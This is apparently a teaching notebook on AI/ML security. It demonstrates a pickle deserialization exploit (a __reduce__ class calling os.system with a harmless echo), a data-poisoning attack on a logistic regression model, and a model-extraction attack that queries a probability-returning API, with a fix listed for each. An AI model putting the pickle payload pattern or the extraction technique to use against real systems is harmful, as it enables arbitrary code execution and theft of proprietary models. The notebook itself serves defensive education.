# AI Security Vulnerabilities Demonstration

This notebook demonstrates **three major classes of AI/ML security vulnerabilities**:

1. Pickle Deserialization (Arbitrary Code Execution)
2. Data Poisoning (Model Integrity Attack)
3. Model Extraction (Model Theft Attack)

Each section explains:
- What the vulnerability is
- Why it happens
- How the attack works
- How to fix it


# Demo 1 — Pickle Deserialization Vulnerability

`pickle.load()` can execute arbitrary Python code during deserialization.

This means a malicious model file can:
- Run system commands
- Steal credentials
- Install backdoors
- Modify other models

Below, we simulate a malicious pickle file.

In [1]:
import pickle, os

class MaliciousModel:
    """Executes code when unpickled"""
    def __reduce__(self):
        cmd = 'echo "EXPLOIT SUCCESSFUL: Arbitrary code executed"'
        return (os.system, (cmd,))

with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

print("Malicious pickle file created.")

Malicious pickle file created.


### Loading the malicious model
This simulates a developer loading a model from disk.

**This is where the exploit triggers.**

In [2]:
with open('malicious_model.pkl', 'rb') as f:
    model = pickle.load(f)

os.remove('malicious_model.pkl')

EXPLOIT SUCCESSFUL: Arbitrary code executed


### Fix: Never use pickle for model loading
Use safer formats:
- ONNX
- TensorFlow SavedModel
- PyTorch `state_dict`
- SafeTensors


# Demo 2 — Data Poisoning Attack

If an attacker can influence your training data, they can:
- Reduce model accuracy
- Cause targeted misclassifications
- Insert backdoors
- Manipulate fraud detection or access control

Below, we show how **100 poisoned samples** can degrade a model.

In [5]:
import numpy as np
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score

np.random.seed(42)

# Clean data
X_clean = np.random.randn(1000, 10)
y_clean = (X_clean[:, 0] > 0).astype(int)

model_clean = LogisticRegression(max_iter=1000)
model_clean.fit(X_clean, y_clean)

X_test = np.random.randn(200, 10)
y_test = (X_test[:, 0] > 0).astype(int)

acc_clean = accuracy_score(y_test, model_clean.predict(X_test))
acc_clean

0.98

### Attacker injects poisoned samples

In [6]:
X_poison = np.random.randn(100, 10)
X_poison[:, 0] = -5
y_poison = np.ones(100)

X_poisoned = np.vstack([X_clean, X_poison])
y_poisoned = np.hstack([y_clean, y_poison])

model_poisoned = LogisticRegression(max_iter=1000)
model_poisoned.fit(X_poisoned, y_poisoned)

acc_poisoned = accuracy_score(y_test, model_poisoned.predict(X_test))
acc_poisoned

0.635

### Impact
- Clean accuracy: `acc_clean`
- Poisoned accuracy: `acc_poisoned`

### Fixes
- Validate data sources
- Detect outliers
- Monitor label distributions
- Use robust training techniques


# Demo 3 — Model Extraction Attack

If your ML API returns **too much information**, attackers can:
- Clone your model
- Steal your intellectual property
- Reproduce predictions without paying

This demo shows how returning **probabilities** enables model theft.

In [7]:
from sklearn.neural_network import MLPClassifier

class VulnerableMLAPI:
    def __init__(self):
        X = np.random.randn(5000, 20)
        y = (X[:, 0] + X[:, 1] > 0).astype(int)
        self.model = MLPClassifier(hidden_layer_sizes=(50, 30), max_iter=500)
        self.model.fit(X, y)

    def predict(self, X):
        return self.model.predict_proba(X)

api = VulnerableMLAPI()

### Attacker queries the API repeatedly

In [8]:
X_synth = np.random.randn(2000, 20)
stolen_labels = []

for x in X_synth:
    probs = api.predict(x.reshape(1, -1))
    stolen_labels.append(int(probs[0][1] > 0.5))

stolen_labels = np.array(stolen_labels)

### Attacker trains a surrogate model

In [9]:
stolen_model = MLPClassifier(hidden_layer_sizes=(50, 30), max_iter=500)
stolen_model.fit(X_synth, stolen_labels)

X_test = np.random.randn(500, 20)
orig_preds = (api.predict(X_test)[:, 1] > 0.5).astype(int)
stolen_preds = stolen_model.predict(X_test)

from sklearn.metrics import accuracy_score
agreement = accuracy_score(orig_preds, stolen_preds)
agreement

0.968

### Impact
The attacker now has a **high‑fidelity clone** of your model.

### Fixes
- Return only class labels, not probabilities
- Add rate limiting
- Add anomaly detection
- Add authentication & monitoring


# Summary — Why Secure AI Development Matters

This notebook demonstrated:

### 1. Pickle Deserialization
- Arbitrary code execution
- Fix: Use safe model formats

### 2. Data Poisoning
- Model integrity failure
- Fix: Validate data, detect anomalies

### 3. Model Extraction
- Intellectual property theft
- Fix: Limit API outputs, rate limit, monitor

---
**Most ML vulnerabilities are CODE issues, not algorithm issues.**
Static analysis tools (Bandit, Semgrep, Safety) can detect many of these patterns.
